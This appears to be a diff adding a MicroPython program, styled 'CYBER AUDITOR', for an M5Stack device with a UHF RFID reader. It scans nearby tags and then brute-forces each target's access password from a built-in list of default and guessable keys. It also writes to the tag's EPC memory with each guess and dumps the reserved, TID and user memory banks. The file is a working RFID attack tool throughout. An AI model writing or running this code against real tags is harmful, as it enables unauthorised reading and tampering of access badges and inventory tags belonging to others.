@@ -1,0 +1,350 @@
+# SPDX-FileCopyrightText: 2024 M5Stack Technology CO LTD
+# SPDX-License-Identifier: MIT
+
+import os, sys, time, machine
+import M5
+from M5 import *
+from unit import UHFRFIDUnit
+from machine import WDT
+
+# --- CORES ---
+C_BG      = 0x000000 
+C_PANEL   = 0x1A1A1A 
+C_ACCENT  = 0x00FFFF 
+C_TEXT    = 0xFFFFFF 
+C_SUBTEXT = 0xAAAAAA 
+C_GREY_BTN= 0x444444 
+C_SUCCESS = 0x00FF00 
+C_DANGER  = 0xFF0000 
+C_HEADER  = 0x003333 
+
+# --- HARDWARE ---
+PIN_TX = 22
+PIN_RX = 21
+
+uhf = None
+wdt = None
+tags_encontradas = [] 
+cursor_index = 0      
+
+# --- DATABASE ---
+CHIP_DB = {
+    "E28011": "Impinj Monza", "E20060": "NXP UCODE", "E20034": "Alien Higgs"
+}
+
+KEYS = ["00000000", "FFFFFFFF", "12345678", "88888888", "11111111",
+        "99999999", "12341234", "00001234", "12340000", "AABBCCDD"]
+for ano in range(2018, 2027):
+    s = str(ano); KEYS += [s+s, "0101"+s, s+"0101", s+"0000"]
+KEYS += ["54414747", "50415353", "AD00AD00", "DEADBEEF", "CAFEBABE"]
+KEYS = list(dict.fromkeys(KEYS)) 
+
+def setup():
+    global wdt
+    M5.begin()
+    try:
+        wdt = WDT(timeout=45000) 
+        wdt.feed()
+    except: pass
+
+    try:
+        i2c = machine.I2C(0, scl=machine.Pin(PIN_RX), sda=machine.Pin(PIN_TX))
+        i2c.deinit()
+        time.sleep(0.1)
+    except: pass
+    
+    iniciar_uhf()
+    tela_scan_mode()
+
+def iniciar_uhf():
+    global uhf
+    try:
+        if uhf:
+            try: uhf.deinit()
+            except: pass
+        uhf = UHFRFIDUnit(1, port=(PIN_TX, PIN_RX))
+        uhf.set_working_region(UHFRFIDUnit.USA)
+        uhf.set_tx_power(26) 
+    except: machine.reset()
+
+# --- HELPERS UI ---
+def ui_header(titulo):
+    M5.Lcd.fillScreen(C_BG)
+    M5.Lcd.fillRect(0, 0, 320, 35, C_HEADER)
+    M5.Lcd.drawLine(0, 35, 320, 35, C_ACCENT)
+    
+    M5.Lcd.setTextSize(2)
+    M5.Lcd.setTextColor(C_ACCENT, C_HEADER)
+    M5.Lcd.setCursor(10, 10)
+    M5.Lcd.print(titulo)
+    
+    M5.Lcd.drawRect(280, 10, 30, 15, C_TEXT)
+    M5.Lcd.fillRect(282, 12, 26, 11, C_SUCCESS)
+
+def ui_footer(bt_a, bt_b, bt_c):
+    y = 210
+    M5.Lcd.fillRect(0, y, 320, 30, C_PANEL)
+    M5.Lcd.drawLine(0, y, 320, y, C_SUBTEXT)
+    M5.Lcd.setTextSize(1)
+    
+    if bt_a:
+        M5.Lcd.fillRoundRect(35, y+5, 50, 20, 4, C_ACCENT)
+        M5.Lcd.setTextColor(C_BG, C_ACCENT) 
+        M5.Lcd.setCursor(42, y+11); M5.Lcd.print(bt_a)
+        
+    if bt_b:
+        M5.Lcd.fillRoundRect(135, y+5, 50, 20, 4, C_GREY_BTN)
+        M5.Lcd.setTextColor(C_TEXT, C_GREY_BTN) 
+        M5.Lcd.setCursor(142, y+11); M5.Lcd.print(bt_b)
+        
+    if bt_c:
+        M5.Lcd.fillRoundRect(235, y+5, 50, 20, 4, C_DANGER)
+        M5.Lcd.setTextColor(C_TEXT, C_DANGER) 
+        M5.Lcd.setCursor(242, y+11); M5.Lcd.print(bt_c)
+
+def limpar_dado(raw):
+    if raw is None: return "---"
+    try: return str(raw).replace("b'", "").replace("'", "")
+    except: return "Erro"
+
+def identificar_chip(tid):
+    t = limpar_dado(tid)
+    if len(t) < 6: return "Gen2 Standard"
+    return CHIP_DB.get(t[:6].upper(), "Standard Tag")
+
+# --- CORE LOGIC ---
+def travar_na_tag(epc):
+    try: 
+        if uhf: uhf.select(1, 32, len(epc)*4, epc)
+        time.sleep(0.05)
+    except: pass
+
+def resetar_filtro():
+    try: uhf.select(1, 0, 0, "") 
+    except: pass
+
+# --- TELAS ---
+def desenhar_lista_tags():
+    M5.Lcd.fillRect(0, 36, 320, 174, C_BG)
+    
+    if not tags_encontradas:
+        M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
+        M5.Lcd.setTextSize(2)
+        M5.Lcd.setCursor(80, 100); M5.Lcd.print("NO SIGNAL")
+        return
+
+    M5.Lcd.setTextColor(C_ACCENT, C_BG)
+    M5.Lcd.setTextSize(1)
+    M5.Lcd.setCursor(250, 42); M5.Lcd.print(f"ALVOS: {len(tags_encontradas)}")
+
+    start_idx = max(0, cursor_index - 3)
+    y = 60
+    
+    for i in range(start_idx, min(len(tags_encontradas), start_idx + 3)):
+        tag = tags_encontradas[i]
+        
+        if i == cursor_index:
+            M5.Lcd.fillRoundRect(10, y, 300, 40, 6, C_ACCENT)
+            txt_color = C_BG; bg_color = C_ACCENT; icon = ">"
+        else:
+            M5.Lcd.fillRoundRect(10, y, 300, 40, 6, C_PANEL)
+            txt_color = C_SUBTEXT; bg_color = C_PANEL; icon = " "
+
+        M5.Lcd.setTextColor(txt_color, bg_color)
+        M5.Lcd.setTextSize(1) 
+        M5.Lcd.setCursor(20, y+16) 
+        
+        disp_epc = tag[:26] 
+        M5.Lcd.print(f"{icon} {disp_epc}")
+        y += 45
+
+def tela_scan_mode():
+    global tags_encontradas, cursor_index
+    resetar_filtro() 
+    tags_encontradas = []
+    cursor_index = 0
+    
+    ui_header("CYBER AUDITOR v6.3")
+    ui_footer("SCAN", "NEXT", "HACK") 
+    desenhar_lista_tags()
+    
+    while True:
+        M5.update()
+        if wdt: wdt.feed()
+        
+        if M5.BtnA.isPressed():
+            M5.Lcd.fillCircle(305, 20, 4, C_ACCENT)
+            try:
+                dados = uhf.inventory()
+                if dados:
+                    epc = str(dados).replace("b'", "").replace("'", "")
+                    if epc not in tags_encontradas and len(epc) > 4:
+                        tags_encontradas.append(epc)
+                        M5.Speaker.tone(4000, 20)
+                        desenhar_lista_tags()
+            except: pass
+            time.sleep(0.05)
+            M5.Lcd.fillCircle(305, 20, 4, C_HEADER)
+            
+        if M5.BtnB.wasPressed():
+            if tags_encontradas:
+                cursor_index = (cursor_index + 1) % len(tags_encontradas)
+                desenhar_lista_tags()
+                M5.Speaker.tone(1000, 50)
+        
+        if M5.BtnC.wasPressed():
+            if tags_encontradas:
+                alvo = tags_encontradas[cursor_index]
+                M5.Speaker.tone(2000, 100)
+                executar_ataque(alvo)
+                return 
+
+def atualizar_progresso(i, total, senha):
+    step = int(total / 40)
+    if step < 1: step = 1
+    if i % step != 0 and i != total: return
+    
+    pct = int((i / total) * 100)
+    bar_w = 280
+    fill_w = int((i / total) * bar_w)
+    
+    M5.Lcd.drawRect(20, 120, bar_w, 20, C_SUBTEXT)
+    M5.Lcd.fillRect(22, 122, fill_w, 16, C_ACCENT)
+    
+    M5.Lcd.fillRect(120, 150, 100, 30, C_BG)
+    M5.Lcd.setCursor(135, 155)
+    M5.Lcd.setTextSize(2)
+    M5.Lcd.setTextColor(C_TEXT, C_BG)
+    M5.Lcd.print(f"{pct}%")
+    
+    M5.Lcd.fillRect(0, 90, 320, 20, C_BG)
+    M5.Lcd.setCursor(20, 90)
+    M5.Lcd.setTextSize(1)
+    M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
+    M5.Lcd.print(f"TRYING: {senha}")
+
+def ler_memoria(senha):
+    if wdt: wdt.feed()
+    res = {"PWD": senha, "RES": None, "EPC": None, "TID": None, "USR": None}
+    p = senha if senha else "00000000"
+    
+    try: res["RES"] = limpar_dado(uhf.read_mem_bank(0, 0, 4, p))
+    except: pass
+    if wdt: wdt.feed()
+    try: res["EPC"] = limpar_dado(uhf.read_mem_bank(1, 2, 8, p))
+    except: pass
+    try: res["TID"] = limpar_dado(uhf.read_mem_bank(2, 0, 6, p))
+    except: pass
+    try: res["USR"] = limpar_dado(uhf.read_mem_bank(3, 0, 4, p))
+    except: pass
+    return res
+
+def tela_relatorio(dados, sucesso):
+    ui_header("DUMP REPORT")
+    ui_footer("", "EXIT", "") 
+    
+    status_txt = "ACCESS GRANTED" if sucesso else "RESTRICTED"
+    bg_col = C_SUCCESS if sucesso else C_DANGER
+    
+    M5.Lcd.fillRect(0, 40, 320, 25, bg_col)
+    M5.Lcd.setTextSize(2)
+    M5.Lcd.setTextColor(C_BG)
+    M5.Lcd.setCursor(60, 45); M5.Lcd.print(status_txt)
+    
+    # Subi tudo e diminui espaçamento (Antes 80 -> Agora 75)
+    y = 75
+    
+    def draw_row(l, v, y_pos, color=C_TEXT):
+        M5.Lcd.setTextSize(1)
+        M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
+        M5.Lcd.setCursor(10, y_pos); M5.Lcd.print(l)
+        M5.Lcd.setTextColor(color, C_BG)
+        M5.Lcd.setCursor(110, y_pos); M5.Lcd.print(v[:20])
+        M5.Lcd.drawLine(10, y_pos+10, 310, y_pos+10, C_PANEL)
+
+    chip = identificar_chip(dados["TID"])
+    pwd_disp = dados["PWD"] if dados["PWD"] else "OPEN/UNKNOWN"
+    
+    # Espaçamento reduzido de 20 para 18 pixels
+    draw_row("PASSWORD", pwd_disp, y, C_ACCENT)
+    draw_row("CHIP TYPE", chip, y+18, C_SUCCESS)
+    draw_row("EPC ID", dados["EPC"], y+36)
+    draw_row("TID SERIAL", dados["TID"], y+54)
+    
+    # User Memory (Subiu e diminuiu altura)
+    M5.Lcd.setTextColor(C_ACCENT, C_BG)
+    M5.Lcd.setCursor(10, y+80); M5.Lcd.print("USER MEMORY DUMP:")
+    
+    # Caixa Reduzida (30px de altura em vez de 40px)
+    # Termina em y+125, deixando espaço de sobra para o footer (y=210)
+    M5.Lcd.drawRect(10, y+95, 300, 30, C_PANEL)
+    
+    M5.Lcd.setTextColor(C_TEXT, C_BG)
+    M5.Lcd.setCursor(15, y+105)
+    
+    u_data = dados["USR"]
+    if len(u_data) > 30: M5.Lcd.print(u_data[:28] + "..")
+    else: M5.Lcd.print(u_data)
+
+    while True:
+        M5.update()
+        if wdt: wdt.feed()
+        if M5.BtnB.isPressed():
+            M5.Speaker.tone(1000, 50)
+            break
+        time.sleep(0.1)
+    tela_scan_mode()
+
+def executar_ataque(epc):
+    M5.Lcd.fillScreen(C_BG)
+    M5.Lcd.setTextColor(C_ACCENT, C_BG)
+    M5.Lcd.setTextSize(2)
+    M5.Lcd.setCursor(60, 50); M5.Lcd.print("LOCKING...")
+    
+    travar_na_tag(epc)
+    time.sleep(0.3)
+    
+    ui_header("BRUTE FORCE")
+    ui_footer("", "STOP", "")
+    
+    M5.Lcd.setTextSize(1)
+    M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
+    M5.Lcd.setCursor(10, 50); M5.Lcd.print("TARGET EPC:")
+    M5.Lcd.setTextColor(C_TEXT, C_BG)
+    M5.Lcd.setCursor(10, 65); M5.Lcd.print(epc[:26])
+    
+    senha_encontrada = None
+    total = len(KEYS)
+    
+    for i, senha in enumerate(KEYS):
+        if wdt: wdt.feed()
+        atualizar_progresso(i, total, senha)
+        
+        try:
+            if uhf.write_mem_bank(1, 2, epc, senha):
+                if uhf.read_mem_bank(0, 0, 4, senha):
+                    senha_encontrada = senha
+                    break
+        except: pass
+        
+        M5.update()
+        if M5.BtnB.wasPressed(): 
+            resetar_filtro()
+            tela_scan_mode()
+            return
+        time.sleep_ms(15) 
+        
+    M5.Lcd.fillScreen(C_BG)
+    M5.Lcd.setCursor(80, 100)
+    M5.Lcd.setTextColor(C_ACCENT)
+    M5.Lcd.print("PARSING...")
+    
+    dados = ler_memoria(senha_encontrada)
+    resetar_filtro()
+    tela_relatorio(dados, sucesso=(senha_encontrada is not None))
+
+if __name__ == "__main__":
+    try: setup()
+    except Exception as e:
+        print(e)
+        machine.reset()
